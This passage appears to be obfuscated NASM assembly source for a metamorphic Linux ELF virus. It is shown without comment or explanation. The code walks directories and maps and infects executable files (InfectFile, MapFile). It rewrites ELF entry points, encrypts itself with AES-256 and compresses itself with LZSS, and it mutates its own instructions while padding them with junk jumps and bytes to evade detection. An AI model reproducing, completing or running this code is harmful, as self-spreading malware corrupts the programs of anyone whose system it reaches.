    jl          ..@ehyfPZoubxnM
    jge         ..@ehyfPZoubxnM
..@gTtb4sbRP5BQ:
    pop         rsi
    jmp         ..@XjbhxNEg0C24
..@xGQ7GtefNnxB:
    push        rcx
    pop         rcx
    jmp         $+5
db 0x4c, 0x5b, 0xc2
    jmp         $+4
db 0x98, 0x12
    jmp         ..@mU3ZqRXlixsy
..@XtoXqBWDiW16:
    xchg        rsi, rsi
    jmp         $+5
db 0x01, 0x9d, 0x67
    jmp         ..@eGlUQtDjfx7o
..@IvCgQuVXU7N6:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    push        rbx
    pop         rbx
    jmp         $+4
db 0xee, 0x00
    jmp         $+3
db 0x61
    jmp         $+5
db 0xb6, 0xf5, 0x0f
    jmp         $+4
db 0x7e, 0xdb
    jmp         ..@oKMY3uAJnNyC
..@IVW9QWLYZRo8:
    cmp         rax, 0
    jne         ..@mSgZBkWqVcoU
    mov         r1, [rsp+_INFFILE_OFF.file+file.fileptr]
    jmp         ..@k79i1LYY7b21
..@c5IF0Cynpi8I:
    push        rdi
    jmp         $+3
db 0x9f
    jmp         ..@RCHOmzii8fqW
..@g53MyjQ2xgJX:
    pop         rax
    mov         DWORD [rdi], eax
    mov         rax, QWORD [rsp+_UPDATASIG_OFF.meta_ptr]
    jmp         ..@VxxKtJHj7vq5
..@JyCMJU3h1WLV:
    mov         rbx, QWORD [rsp+_MUTA_OFF.key]
    jb          ..@94k84JH40hHs
    jae         ..@94k84JH40hHs
..@YDEMO30Td73q:
    xchg        rsp, rsp
    mov         rdi, rdi
    push        rax
    jmp         ..@SEqdnHLyL8q0
..@JZAziRuAUJ0Q:
%ifdef X86_32
    xor         eax, eax
%endif
    jmp         $+4
db 0x6d, 0x48
    jmp         $+3
db 0xce
    jmp         ..@rLWLp0ayKoSM
..@5YEP8pJlRtgW:
    mov         BYTE [rdi], bl
    jmp         ..@7mqchtPkP2Ky
..@zRsTC2qr0xP2:
    xchg        rcx, rcx
    jmp         $+4
db 0xd9, 0x7a
    jb          ..@UTojhz6eOy7Z
    jae         ..@UTojhz6eOy7Z
..@AYi5ZrLiyLcF:
    add         rsp, _PAYLOAD_OFF_size
    js          ..@DXHd02N9Y4E6
    jns         ..@DXHd02N9Y4E6
..@jaKizfX2Q2GO:
    push        rdi
    pop         rdi
    jl          ..@22mKOCewfWK9
    jge         ..@22mKOCewfWK9
..@jbp3lvHkuiL7:
%ifdef X86_64
    cmp         edx, 90905850h
    je          ..@22mKOCewfWK9
%endif
    jb          ..@oVuXLm21NVmd
    jae         ..@oVuXLm21NVmd
..@DdVuff2lB0TM:
    xchg        rdi, rdi
    js          ..@Idr2IKFBxw5m
    jns         ..@Idr2IKFBxw5m
..@rpCZppoGOZPE:
    mov         BYTE [rsi], 2dh
    mov         rax, 1
    jmp         ..@oCGmYSVwYlWR
    jl          ..@odaDoTAdJMC6
    jge         ..@odaDoTAdJMC6
..@OcjqlmjoKXle:
    jge         ..@VIudUbte6qRw
    add         r4, 1
    jmp         $+3
db 0xa2
    jl          ..@lsK5AxofgMQ9
    jge         ..@lsK5AxofgMQ9
..@F8mKZewFkzfF:
    je          ..@odaDoTAdJMC6
    cmp         dl, 81h
    jmp         $+5
db 0xd6, 0x2e, 0xa6
    jmp         $+3
db 0x06
    jmp         ..@TYl9qBPnc5Nw
..@PVdtkdVMjzTV:
    xor         rbx, rbx
    mov         rdi, rsi
    add         rdi, rcx
    jl          ..@Pm3OZ0CgsMG3
    jge         ..@Pm3OZ0CgsMG3
..@6V92feddJx9d:
    sub         ax, WORD [rsp+_LZSSE_OFF.la_index]
    mov         edx, LOOKAHEAD_LENGTH
    cmp         ax, LOOKAHEAD_LENGTH
    jmp         $+4
db 0x53, 0x21
    jmp         $+4
db 0xa4, 0x84
    je          ..@nuvAXNmWf4jf
    jne         ..@nuvAXNmWf4jf
..@SKCL6hgJEz3u:
    xor         rdi, rdi
    xor         rdx, rdx
    xor         rbx, rbx
    jmp         $+5
db 0x12, 0xe7, 0x8a
    js          ..@7nhBSp6n8eeI
    jns         ..@7nhBSp6n8eeI
..@FjzCtjpiGDrH:
    push        rax
    xchg        rdx, rdx
    pop         rax
    jmp         $+3
db 0x47
    jl          ..@Mjgcg0mvjm6d
    jge         ..@Mjgcg0mvjm6d
..@PuEWHSuen8vk:
    xor         rdx, rdx
    xor         rbx, rbx
    mov         rdi, rsi
    jmp         ..@iEoE6ca7Qeni
..@2YtRg25IJ9QG:
    push        rax
    jmp         ..@cedswQUZa2Gr
..@5vVe2X67bSYL:
    mov         r1, r4
    jmp         $+4
db 0x13, 0x19
    jmp         $+5
db 0x1d, 0xc3, 0x2b
    jmp         ..@1QeUuPH4P3oX
..@yVn7Bbba8Wzc:
    cmp         ecx, DWORD [rsp+_MUTA_OFF.size]
    jge         ..@76UtvF8CkhTo
    jb          ..@kBgzb2EEIGiI
    jae         ..@kBgzb2EEIGiI
..@J4Sjbxs73beZ:
    and         al, 111b
    jmp         $+5
db 0x7a, 0x04, 0x8c
    je          ..@4PULVwcmz2Wa
    jne         ..@4PULVwcmz2Wa
..@8CLPWn9dYk77:
    mov         r4, r5
    and         r4, 10b
    OFILE       QWORD [r2], r4
    jmp         ..@Zrn698o3s95A
..@vT22GHSkU50a:
    cmp         BYTE [r1], '.'
    mov         rsp, rsp
    mov         rdx, rdx
    jmp         $+5
db 0x9e, 0xeb, 0xcb
    jb          ..@x2d7pA0D3WLm
    jae         ..@x2d7pA0D3WLm
..@KjEPR3j1nNbp:
    and         edx, 0fffffff8h
    jb          ..@L516CikN1GDW
    jae         ..@L516CikN1GDW
..@Qq6Bkz5JhMRE:
    shr         dx, 0x4
    add         ecx, 1
    jb          ..@VFwnRCxFVP9m
    jae         ..@VFwnRCxFVP9m
..@QJYPh4pm3WrZ:
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    jmp         ..@q3klJmvdCxoz
..@dkHRDkLINNsu:
    add         QWORD [rsp+_INFDIR_OFF.dirindex], rax
    add         r4, rax
    cmp         r4, QWORD [rsp+_INFDIR_OFF.dirnread]
    jmp         $+3
db 0x24
    jl          ..@7g5cK8dyokob
    jge         ..@7g5cK8dyokob
..@8V7OeZ0OqnBp:
    pop         rdx
    jmp         $+3
db 0xea
    jmp         $+5
db 0xcb, 0x48, 0x88
    jmp         ..@1bmAWiSkKa39
..@UmkWJKXCY9no:
    xor         rcx, rcx
    js          ..@5JlUnn9FZrkr
    jns         ..@5JlUnn9FZrkr
..@vzLWnN1gzzLb:
    mov         al, dl
    je          ..@DrGlWbaQ1CG5
    jne         ..@DrGlWbaQ1CG5
..@RVStMf3rnEzm:
    xor         rdx, rdx
    jmp         ..@JLCnh6WHD4wM
..@Af0D8oCrtF8C:
    add         rsp, 0x20
    jl          ..@V23Bwdjln4BJ
    jge         ..@V23Bwdjln4BJ
..@GS1Ef4yNi6ck:
    rep         stosb
    jb          ..@9EP7JQlnuYD2
    jae         ..@9EP7JQlnuYD2
..@TlOOr11ZBt9S:
    mov         rcx, QWORD [rsp]
    jmp         $+3
db 0x55
    jmp         ..@SvblXKny3BMv
..@mjsRh0FCHHhf:
    call        NonBinaryFile
    push        rdx
    pop         rdx
    je          ..@s8aLM0bkw4nO
    jne         ..@s8aLM0bkw4nO
..@76UtvF8CkhTo:
    add         rsp, _MUTA_OFF_size
    jmp         ..@maOSLPrSWLMP
..@7bgtyRL83eWW:
    call_vsp    Aes256KeyCreation
    jmp         ..@6kybD5EXa8so
..@TpOExPhdL6bw:
%ifdef X86_64
    shr         rdx, 8
%endif
    jmp         $+4
db 0xa1, 0x4d
    jl          ..@Xti8gHOk0tZB
    jge         ..@Xti8gHOk0tZB
..@x2d7pA0D3WLm:
    je          ..@7e2aXlpBXe51
    cmp         WORD [r1], '..'
    je          ..@7e2aXlpBXe51
    jb          ..@m1noplViEXiT
    jae         ..@m1noplViEXiT
..@NX0qQAFhp98l:
    xor         r2, r2
    lea         r1, [rsp+_INFFILE_OFF.file]
    call        UnmapFile
    jmp         $+4
db 0x28, 0x95
    jb          ..@XtoXqBWDiW16
    jae         ..@XtoXqBWDiW16
..@kne6b6kXtZaM:
%ifndef ENABLE_DEBUGGING
    syscall
    cmp         al, 0x0
%endif
    jl          ..@iqsqiZ7wajYq
    jge         ..@iqsqiZ7wajYq
..@mSgZBkWqVcoU:
    add         rsp, _INFFILE_OFF_size
    jmp         ..@0NhaLgC76seF
..@uaPRMwSpKrFC:
    mov         rsi, rsi
    jmp         ..@cyIDqltlLHAf
..@JWemkdSCMqTf:
%ifndef ENABLE_DEBUGGING
    pop         rcx
%endif
    jmp         $+5
db 0x2c, 0x20, 0x64
    jmp         $+4
db 0x44, 0x27
    jmp         ..@wpp5TAFY8shH
..@oVcBIZMnv07i:
    ret
    jmp         $+4
db 0x61, 0x9a
    jmp         ..@Yw6dRmjDEml2
..@xRxflcPlo8mC:
    sub         rbx, r3
    add         rax, rbx
    add         rsp, _VADDR_OFF_size
    jmp         $+5
db 0x2b, 0x18, 0xcb
    js          ..@q4BSrxwCxAvM
    jns         ..@q4BSrxwCxAvM
..@Jd2mr2AfCQPi:
    add         rsi, 1
    jb          ..@ruePeArAwH0N
    jae         ..@ruePeArAwH0N
..@J4Qden9me85a:
    sub         r2, 1
    jmp         $+3
db 0xb4
    jb          ..@YaYVHM2IfVM9
    jae         ..@YaYVHM2IfVM9
..@Xsh6lu1Lu8dd:
%ifdef X86_32
    je          ..@TlOOr11ZBt9S
    cmp         dl, 2dh
%endif
    jmp         $+3
db 0xb4
    jmp         ..@h9uaJjwTkNgC
..@LaRkNY3UX2AR:
%ifndef ENABLE_DEBUGGING
    xchg        rbx, rbx
%endif
    jmp         $+4
db 0xf8, 0xbb
    js          ..@eLAQFp4O4zCz
    jns         ..@eLAQFp4O4zCz
..@39aKxOEhZng4:
    ret
    jmp         $+5
db 0xd4, 0xa0, 0xce
    jmp         $+3
db 0x16
    jl          ..@b4Q6YQEBTlxQ
    jge         ..@b4Q6YQEBTlxQ
..@28zDuIcRnvku:
    call_vsp    Strncmp
    test        rax, rax
    je          ..@jAAW6sOMU7Ms
    jl          ..@Ibj0OQjbgSrP
    jge         ..@Ibj0OQjbgSrP
..@Zrn698o3s95A:
    cmp         eax, 0x3
    jl          ..@Ys8L1a2MFhLU
    jmp         $+3
db 0xfd
    js          ..@Mn0EEe3KoPhJ
    jns         ..@Mn0EEe3KoPhJ
..@c4KjbmBYtRfw:
%ifdef X86_64
    xor         r9, r9
%endif
    jmp         $+4
db 0x72, 0x21
    js          ..@oPGyRtXYW7Bi
    jns         ..@oPGyRtXYW7Bi
..@AN1ysWueQiV8:
    mov         rdi, rdi
    jmp         $+5
db 0x7c, 0x1a, 0x4f
    jmp         ..@7jGFxnB0CKh9
..@zyRdD7CpjpuV:
%ifdef X86_64
    je          ..@22mKOCewfWK9
    mov         edx, DWORD [rdi]
%endif
    jmp         $+5
db 0x37, 0xdb, 0x86
    js          ..@gbVnIus5rw5w
    jns         ..@gbVnIus5rw5w
..@7r1Kqjwq0Pgy:
    and         edx, 0007h
    mov         bl, 58h
    je          ..@gTq2dKGl9G3y
    jne         ..@gTq2dKGl9G3y
..@crx9UFqLtFKc:
    xchg        rbx, rbx
    jb          ..@5HnUtzYUoTbG
    jae         ..@5HnUtzYUoTbG
..@bEEckaOUZAGM:
    and         r2, 0x00ffffff
    jl          ..@vl47GkY3umI5
    jge         ..@vl47GkY3umI5
..@FP1AWrXQbgVR:
    push        rdx
    pop         rdx
    jmp         ..@uswXa1C0FXXV
..@ZKi2F9WQ84Oy:
%ifdef X86_64
    mov         WORD [rsi+rcx], 9090h
%endif
    jb          ..@q0QsByv1y2RR
    jae         ..@q0QsByv1y2RR
..@8Fnn80eERUiR:
    call        Aes256Encryption
    mov         r1, [rsp+_NBF_OFF.file]
    mov         r2, signature_len
    js          ..@AZ50Aj3swbKz
    jns         ..@AZ50Aj3swbKz
..@NwSrJu9pkDM2:
    mov         DWORD [rsp+_PROC_OFF.filefd], eax
    jmp         ..@RxV6xAnNWj9n
..@qzkMsRomW1Qh:
    jmp         ..@jAAW6sOMU7Ms
    jmp         ..@WH2kS6nsQPcJ
..@WCAIsD8ecwzJ:
%ifdef X86_32
    mov         esi, r2
    push        rdx
%endif
    jmp         $+4
db 0x27, 0x37
    jl          ..@gssbpJcbgqs5
    jge         ..@gssbpJcbgqs5
..@MpOR4bOEknRs:
    jmp         ..@jAAW6sOMU7Ms
    jmp         $+5
db 0xd2, 0xe8, 0xde
    jmp         $+3
db 0x72
    jb          ..@jSni2SEiqozn
    jae         ..@jSni2SEiqozn
..@BpgWv3brgE11:
    push        rsi
    jmp         $+4
db 0x85, 0x7b
    jl          ..@NgwRfZQP5krM
    jge         ..@NgwRfZQP5krM
..@o8tuZNAcohWE:
    or          bl, 00101000b
    mov         BYTE [rsi], bl
    jmp         ..@1MDKn4vZBnUk
..@glpuW3c7C70S:
    call        Strcpy
    mov         BYTE [r1], 0x00
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jb          ..@nlOiwzUVqSTw
    jae         ..@nlOiwzUVqSTw
..@UStsjQNED1Gk:
    or          dl, 70h
    sub         ecx, 2
    jmp         $+4
db 0x7f, 0xe0
    jmp         ..@suwTOlaTXgs6
..@XgHcj7KxpPLO:
    movdqu      xmm1, oWORD [rsp+0x90]
    jmp         $+4
db 0xb2, 0x1d
    jmp         $+4
db 0x7b, 0x3b
    jl          ..@z9ixdgZHNVum
    jge         ..@z9ixdgZHNVum
..@XJ4VQcSxTESH:
    call        MapFile
    cmp         rax, 0
    je          ..@PwV5SU96lvY9
    jne         ..@PwV5SU96lvY9
..@R7aoSSgZ8j9R:
    push        rdi
    pop         rdi
    mov         rcx, rcx
    jmp         $+4
db 0xe2, 0x82
    je          ..@rnNgXCFNEP3x
    jne         ..@rnNgXCFNEP3x
..@XS3sLXGfybk5:
    mov         DWORD [rdi], esi
    js          ..@xu3VqM8Aihxl
    jns         ..@xu3VqM8Aihxl
..@GHi6BJGoKkHm:
    sub         rsp, _NBF_OFF_size
    mov         WORD [rsp+_NBF_OFF.index], r2w
    mov         QWORD [rsp+_NBF_OFF.file], r1
    jmp         $+3
db 0xc4
    je          ..@q7Lq46LLN3PZ
    jne         ..@q7Lq46LLN3PZ
..@RbzGLLGryda5:
    and         edx, 111b
    or          dl, 58h
    mov         bl, dl
    jmp         $+5
db 0xc7, 0x57, 0xc0
    jmp         $+4
db 0x3e, 0x66
    jmp         ..@FFrouoDL6QnE
..@cQLLARweLFMR:
    xchg        rcx, rcx
    jmp         $+5
db 0x46, 0xf8, 0x83
    js          ..@y56kgkCI9WcJ
    jns         ..@y56kgkCI9WcJ
..@YaYVHM2IfVM9:
    mov         rax, r2
    je          ..@EYIsfNQDvxiC
    jne         ..@EYIsfNQDvxiC
..@cnv2ZjiMIWk8:
    and         dl, 00101000b
    jmp         ..@aVl3HNHI8RTH
..@UjMLSHgj6bkj:
%ifdef X86_32
    xchg        rsi, rsi
%endif
    jmp         ..@fWW0mtMtVKDk
..@HQLDFDliqbk6:
%ifndef ENABLE_DEBUGGING
    xchg        rdi, rdi
    mov         r2d, 0x1
%endif
    jmp         $+4
db 0x88, 0x88
    jmp         $+4
db 0xb9, 0xc6
    jmp         ..@s5IB0ReV6EkB
..@YsEYEZwACtql:
    pop         rsi
    js          ..@DEtTsFbJTR3v
    jns         ..@DEtTsFbJTR3v
..@IS2JMGpwDmLR:
    mov         r2, QWORD [r5+file.fileptr]
    jmp         $+5
db 0x08, 0x1c, 0xaa
    jmp         ..@ZWJK7Ptpjpij
..@GN2rl6AZYgY0:
    mov         DWORD [rdi], edx
    jb          ..@TFL9s8AHVfDZ
    jae         ..@TFL9s8AHVfDZ
..@fP1B0SKg4e9U:
    add         WORD [rsp+_LZSSE_OFF.la_index], ax
    mov         rdi, rdi
    add         WORD [rsp+_LZSSE_OFF.w_index], ax
    jmp         $+4
db 0xcd, 0x9b
    jmp         ..@1TUp7CwvKQcQ
..@xLPSjBQffRhi:
    mov         rsp, rsp
    jmp         $+5
db 0x46, 0x02, 0xe8
    jmp         ..@sy86thqMCVoN
..@7oskJ0k6bJHP:
    mov         rax, 1
    jmp         $+5
db 0xa6, 0x6a, 0xc0
    jmp         ..@mR23lF7xERUm
..@UnAqD7sowtTY:
    sub         ecx, 1
    jmp         $+5
db 0x13, 0xf7, 0xec
    jb          ..@VyXsI30d1mMs
    jae         ..@VyXsI30d1mMs
..@RMyoHGWj7vKE:
    OFILE       [rsp+_PROC_OFF.buffer], 0x00
    cmp         eax, 0x3
    jle         ..@PA9RtOahiuFj
    jmp         $+3
db 0x30
    jmp         ..@NwSrJu9pkDM2
..@A0abqxS1xIPK:
    jmp         ..@tRQgcVEpIQNn
    js          ..@V6n0DiztnB4a
    jns         ..@V6n0DiztnB4a
..@ehyfPZoubxnM:
    xchg        rax, rax
    js          ..@XgHcj7KxpPLO
    jns         ..@XgHcj7KxpPLO
..@go8Khz5CQu8T:
    je          ..@tcyebFYfahNp
    js          ..@XhSn868Idt4L
    jns         ..@XhSn868Idt4L
..@QfjFbmBINyM6:
%ifdef X86_64
    mov         rsp, rsp
%endif
    js          ..@udrmKAr6gjbz
    jns         ..@udrmKAr6gjbz
..@fM8Xhaby6N9k:
    push        rdi
    pop         rdi
    jmp         $+4
db 0x2b, 0x43
    jmp         $+3
db 0xbc
    jl          ..@h5raGvhPRPS9
    jge         ..@h5raGvhPRPS9
..@p0Gy9xUfE99U:
    mov         rcx, rcx
    push        rsi
    jmp         ..@0GEkYsOWitg4
..@CEUZ3qHcGfmA:
%ifdef X86_32
    mov         edi, DWORD [edi+file.filefd]
%endif
    jl          ..@wwAMGrBRslwL
    jge         ..@wwAMGrBRslwL
..@OrcBYayvzeN9:
    sub         rsp, _LZSSE_OFF_size
    jmp         $+3
db 0xd1
    jb          ..@yW123RJPGvbm
    jae         ..@yW123RJPGvbm
..@S6DKNnmKMLPa:
    mov         r1d, eax
    jmp         $+5
db 0x28, 0x21, 0xbc
    je          ..@q75Bv9FKgseO
    jne         ..@q75Bv9FKgseO
..@KQXJUmH68PGv:
    mov         r3, r2
    jmp         $+5
db 0xf0, 0xc0, 0x44
    jb          ..@2mk6w16RZ7O9
    jae         ..@2mk6w16RZ7O9
..@rgP0jkbg6qo2:
    mov         rbx, rbx
    mov         QWORD [rsp+_PROC_OFF.dirindex], 0x00
    jl          ..@HHHOrlucRcC5
    jge         ..@HHHOrlucRcC5
..@x2cIzvHIoN7R:
    sub         rdi, 1
    sub         rsi, 1
    jl          ..@rJytU4Pgw5fY
    jge         ..@rJytU4Pgw5fY
..@lP5lPdMgt1JI:
    xor         r2, r2
    jmp         ..@Z7r5AQqkURop
..@Vj6nQKqyOLl7:
    call        ConvertMoveZeroToXor
    mov         rdx, rdx
    jmp         $+5
db 0x34, 0xfc, 0x93
    jb          ..@pM1IXJvi1Cs4
    jae         ..@pM1IXJvi1Cs4
..@D67Wc1UAM9AW:
    and         al, 111b
    jb          ..@ZtNqcFSnLXJx
    jae         ..@ZtNqcFSnLXJx
..@ggVm4Iygtbxp:
%ifdef X86_64
    shl         rbx, 8
%endif
    jmp         ..@lUe3O7E2ljon
..@E1QgtrbpVcT5:
    xchg        rdi, rdi
    jmp         ..@wqDdvyhDcTQG
    jmp         $+3
db 0x72
    jmp         $+5
db 0xe6, 0x44, 0x3d
    jmp         ..@wqDdvyhDcTQG
..@Y3LjlB3JNZ25:
    test        cl, cl
    jmp         $+4
db 0x50, 0xf4
    jmp         ..@J2zLCZsjaEQL
..@dFHBM9zlkCcA:
    push        rcx
    pop         rcx
    js          ..@sYh885LApgDD
    jns         ..@sYh885LApgDD
..@kfopQMa810Fc:
    xor         r1, r1
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.keyprev]
    call        WORDToDWORDASCII
    jmp         $+3
db 0x14
    jl          ..@UsBwyiCpEYhP
    jge         ..@UsBwyiCpEYhP
..@eSMa1hDiA1cC:
    push        rdi
    jmp         $+3
db 0x6e
    jmp         $+5
db 0x52, 0x3f, 0x15
    jmp         $+3
db 0x76
    jmp         ..@abAUiN9nx6rN
..@ZWJK7Ptpjpij:
    GGLOBAL     _signature
    mov         r1, r5
    jb          ..@DGlFjIj1imL4
    jae         ..@DGlFjIj1imL4
..@CWxnXG3wUUoz:
%ifdef X86_32
    push        rdx
%endif
    jmp         ..@v3Ldp2BWGfaJ
..@CzPnK90aBfeT:
%ifdef X86_64
    mov         BYTE [rdi], 41h
    add         rdi, 1
%endif
    jmp         $+4
db 0x2a, 0xbd
    jl          ..@WMamxcs9cFuu
    jge         ..@WMamxcs9cFuu
..@gCGj1zXvuKYI:
    jmp         ..@cZ3uI3PqtNep
    jmp         $+4
db 0x77, 0xb1
    jmp         $+3
db 0x37
    jmp         ..@0Xqqp1KMJv1l
..@YHdhUORXmRHW:
    jnz         ..@amdq3pPU6wtm
    jmp         $+3
db 0x54
    js          ..@gCGj1zXvuKYI
    jns         ..@gCGj1zXvuKYI
..@BLSMEZmodf94:
%ifdef X86_64
    pop         rbx
    jne         ..@Efp5fq25lcoG
    add         rcx, 1
%endif
    jmp         $+5
db 0x02, 0x05, 0x16
    jmp         $+4
db 0x74, 0xe9
    jmp         $+4
db 0xe9, 0x86
    je          ..@Efp5fq25lcoG
    jne         ..@Efp5fq25lcoG
..@nsFmeBspwjR7:
    cmp         rax, r2
    xchg        rax, rax
    jl          ..@LvEJgcnZ2V0d
    jge         ..@LvEJgcnZ2V0d
..@mS4iGbhivhvW:
    push        rcx
    jmp         $+5
db 0x60, 0x14, 0xa5
    jmp         $+5
db 0x83, 0xdf, 0x1c
    jmp         $+5
db 0x30, 0x34, 0x9a
    jmp         ..@Dik41WCCgUoO
..@AyyYVigYT09L:
    movdqu      xmm0, [rsi+rcx]
    je          ..@VmLPmMqwJnTo
    jne         ..@VmLPmMqwJnTo
..@PTfk1hp6SeRu:
    mov         rcx, rdi
    push        rdi
    jmp         $+4
db 0x68, 0x66
    jb          ..@VqQnD3rV5qqG
    jae         ..@VqQnD3rV5qqG
..@eVneTtkh0dFA:
    mov         QWORD [r1+e_h.e_entry], r3
    or          QWORD [r1+e_h.e_entry], 1b
    jmp         $+5
db 0x2e, 0x82, 0x83
    jmp         $+3
db 0x68
    jmp         $+3
db 0x92
    jmp         ..@f6efuwFxoplr
..@rPa2DEUJ56Ps:
    pop         rcx
    pop         rax
    push        r2
    js          ..@nFd2D2aFhW18
    jns         ..@nFd2D2aFhW18
..@p5nS9UPt9BhY:
    mov         rdi, rdi
    jmp         ..@VHeWHt6mkIgg
UnmapFile:
    jmp         ..@J729Zg5u7Tjv
..@ChOitFJWMYyD:
    je          ..@bFMMf2zUWMo1
    jmp         $+3
db 0xb4
    jmp         ..@oE3DDq7lXtjS
..@5r6qrXHUZEMI:
    call        MemMove
    mov         r1, m6
    add         r1, non_packed_len+PADDING
    jmp         $+3
db 0x2b
    js          ..@Qc5tVqddkYRw
    jns         ..@Qc5tVqddkYRw
..@VttC82lhuhqu:
    test        al, al
    jz          ..@2ka0lrqUJh0l
    call        ConvertAddToSub
    jmp         ..@2ka0lrqUJh0l
..@YQZA2x87yJVc:
    rep         movsb
    jl          ..@n4K2yyQUjZpO
    jge         ..@n4K2yyQUjZpO
..@RQ5NuF3ajToc:
    cmp         rax, 0x02
    jmp         $+5
db 0x17, 0x02, 0x83
    jl          ..@04j9wQWZBGFF
    jge         ..@04j9wQWZBGFF
..@tBRMR3MrchNU:
    pop         r3
    xchg        rcx, rcx
    pop         r2
    jb          ..@JTXzTEBU3BNa
    jae         ..@JTXzTEBU3BNa
..@Tpf2Nhmyw39G:
    xchg        rbx, rbx
    jmp         $+5
db 0xae, 0x14, 0x61
    jb          ..@B60tJa398iHE
    jae         ..@B60tJa398iHE
UpdateSignature:
    jmp         ..@XC2Ul1dt2aOc
..@mU3ZqRXlixsy:
    xor         rax, rax
    jmp         $+4
db 0x4b, 0xb0
    js          ..@oVcBIZMnv07i
    jns         ..@oVcBIZMnv07i
..@yz9MvUTVxAIY:
    push        rbx
    pop         rbx
    jmp         $+5
db 0xca, 0x14, 0xbd
    js          ..@zcXGIL1IoMft
    jns         ..@zcXGIL1IoMft
..@D3ZVTXwbnoBm:
%ifdef X86_32
    mov         ecx, DWORD [edi+file.filesize]
    mov         edx, esi
    mov         esi, 0x01
%endif
    jmp         ..@CEUZ3qHcGfmA
..@pCwUEfA62ysq:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    xor         rax, rax
    jmp         $+3
db 0x10
    jmp         $+5
db 0x3a, 0x72, 0x71
    jl          ..@6jlkif4KDwFf
    jge         ..@6jlkif4KDwFf
..@d7jJx00jpdOy:
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    jb          ..@nK6R93uxJj2V
    jae         ..@nK6R93uxJj2V
..@EYIsfNQDvxiC:
    movzx       r3, WORD [r1+e_h.e_phentsize]
    mov         rsi, rsi
    js          ..@HjTuEn4VH3zl
    jns         ..@HjTuEn4VH3zl
..@llpkKbb9zjOo:
    mov         rax, (-1)
    jmp         $+4
db 0x02, 0x62
    jmp         $+5
db 0xb7, 0xf0, 0x5e
    jmp         ..@uZ2UKGMsS40q
..@Y1Tnv550kINb:
    pop         r3
    pop         r2
    jmp         ..@Zwj8zqrBJjw9
..@lgibe0fsYdJj:
    pop         rsi
    jmp         $+4
db 0xa1, 0xe9
    jb          ..@rgP0jkbg6qo2
    jae         ..@rgP0jkbg6qo2
..@MSM5oJdOsF6P:
    mov         QWORD [r5+file.fileptr], 0x00
    jmp         $+4
db 0x27, 0xab
    jmp         ..@LOxBkrWbho3F
..@WK2tGdv0QNxg:
    movdqu      xmm1, oWORD [rsp+0x40]
    jmp         $+3
db 0x13
    jl          ..@wxRGFXLuTNqB
    jge         ..@wxRGFXLuTNqB
..@8NDBRKBinjHs:
    xchg        rbx, rbx
    syscall
    jmp         ..@B6R2AAnFExe1
..@SBOoNEKI7i8Z:
    mov         eax, 0x0
    rep         stosb
    jmp         $+3
db 0x65
    jmp         ..@PvHxEUD3DIgG
..@1lBDBezIq1rp:
    mov         bl, dl
    jmp         $+4
db 0x8a, 0x77
    jmp         ..@cnv2ZjiMIWk8
..@5SSlfl4DIfiQ:
    pop         rcx
    jmp         ..@sBBzkCJrhy4H
..@JTYZ4Robt4jk:
    mov         rax, SYS_FORK
    jmp         ..@8NDBRKBinjHs
..@DGlFjIj1imL4:
    mov         r3, _signature.startsize
    jl          ..@28zDuIcRnvku
    jge         ..@28zDuIcRnvku
..@dkpRc0CGEAx2:
    add         r4, r3
    jmp         $+3
db 0xb1
    js          ..@lo97Tduom52c
    jns         ..@lo97Tduom52c
..@OT0gl0k8VM1D:
    push        rcx
    jl          ..@FR16nF9CgAqR
    jge         ..@FR16nF9CgAqR
..@bMQwHaN7y0q2:
    mov         r1, m6
    mov         r2, original_virus_len+PADDING
    mov         eax, SYS_MUNMAP
    jmp         $+4
db 0x8f, 0x20
    je          ..@80qeS6ZZU69k
    jne         ..@80qeS6ZZU69k
..@O1eDQxFG96c4:
    jmp         ..@4TLwH3pJKSvG
    jb          ..@Eanh4onfRkFS
    jae         ..@Eanh4onfRkFS
..@DQApDIXBnQUn:
    mov         rax, 0x1
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    js          ..@EMYmI8xWY5Jj
    jns         ..@EMYmI8xWY5Jj
..@hjtB3nd0x7E1:
%ifdef X86_64
    mov         rax, 0x0000900000000000
%endif
    jb          ..@vVjf1EvbglVI
    jae         ..@vVjf1EvbglVI
..@qxbKfLiWGLqp:
    ret
    je          ..@CjOFnyczNUbZ
    jne         ..@CjOFnyczNUbZ
..@q75Bv9FKgseO:
    mov         r2, QWORD [rsp+_KEYGEN_OFF.bufferaddr]
    jmp         $+4
db 0xf1, 0xbe
    js          ..@xT39H6EiAR0V
    jns         ..@xT39H6EiAR0V
..@AcOOQDtSquQY:
    mov         r4, m7
    sub         r4, m6
    je          ..@i44QyKogSeJm
    jne         ..@i44QyKogSeJm
..@n53hxjENP8cr:
    mov         DWORD [rsp+_INFDIR_OFF.dirfd], eax
    mov         rdx, rdx
    jmp         $+3
db 0xad
    js          ..@CgJqUux0xpqb
    jns         ..@CgJqUux0xpqb
..@IoJ5CqNBCX21:
%ifdef X86_64
    rep         nop
%endif
    jmp         $+4
db 0xb3, 0xe4
    jmp         ..@2jzMoLNu6P2H
..@gj7vik8ObgTa:
    mov         QWORD [rsp+_INFDIR_OFF.dirnread], rax
    jmp         $+4
db 0xd8, 0xf1
    jmp         ..@qQjfejxkgFqS
..@IJlmoEvYmJ17:
    push        rsi
    push        rcx
    jl          ..@hsYBBsakIA3P
    jge         ..@hsYBBsakIA3P
..@BF0S18XyC9iZ:
%ifdef X86_64
    cmp         edx, 58415041h
    je          ..@22mKOCewfWK9
    mov         edx, DWORD [rdi]
%endif
    jmp         $+4
db 0xa1, 0x2d
    jmp         $+4
db 0x6c, 0xe1
    jl          ..@madFvqsBdEiZ
    jge         ..@madFvqsBdEiZ
..@nlOiwzUVqSTw:
    call        InfectFile
    jmp         $+3
db 0x00
    jmp         ..@7e2aXlpBXe51
..@BsKLGs3Xl8mJ:
    je          ..@cKbxaJ3EaKS9
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    js          ..@csWvJ3duLGi8
    jns         ..@csWvJ3duLGi8
..@aY7fhA7Mr0Vu:
%ifdef X86_64
    push        rax
%endif
    jmp         ..@l7tjE7i7aPnb
..@YwkeTuzgBeCP:
    ODIR        [rsp+_PROC_OFF.dirfd], [rsp+_PROC_OFF.dirbuf], DIRENT_BUFSIZE
